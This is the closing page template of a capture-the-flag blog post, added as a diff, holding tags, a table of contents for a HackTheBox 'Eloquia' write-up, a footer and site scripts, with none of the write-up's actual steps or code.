+                        <a href="/tags/evil-winrm/">#evil-winrm</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Race-Condition/">#Race Condition</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Windows-PE/">#Windows-PE</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/10/13/Hackthebox-DevHub/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: DevHub</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Eloquia</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-http-eloquia-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;eloquia.htb&#x2F; </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2025-2336-AngularJS-ngSanitize-SVG-XSS"><span class="nav-text">CVE-2025-2336 - AngularJS ngSanitize SVG XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Winning-the-15-Second-Race"><span class="nav-text">Winning the 15-Second Race</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-via-SQLite-load-extension"><span class="nav-text">RCE via SQLite load_extension()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Looting-Microsoft-Edge-Credentials"><span class="nav-text">Looting Microsoft Edge Credentials</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Flag-WinRM-as-olivia-kat"><span class="nav-text">User Flag - WinRM as olivia.kat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-Racing-the-Failure2Ban-Build"><span class="nav-text">Privilege Escalation - Racing the Failure2Ban Build</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Key-Takeaways"><span class="nav-text">Key Takeaways</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
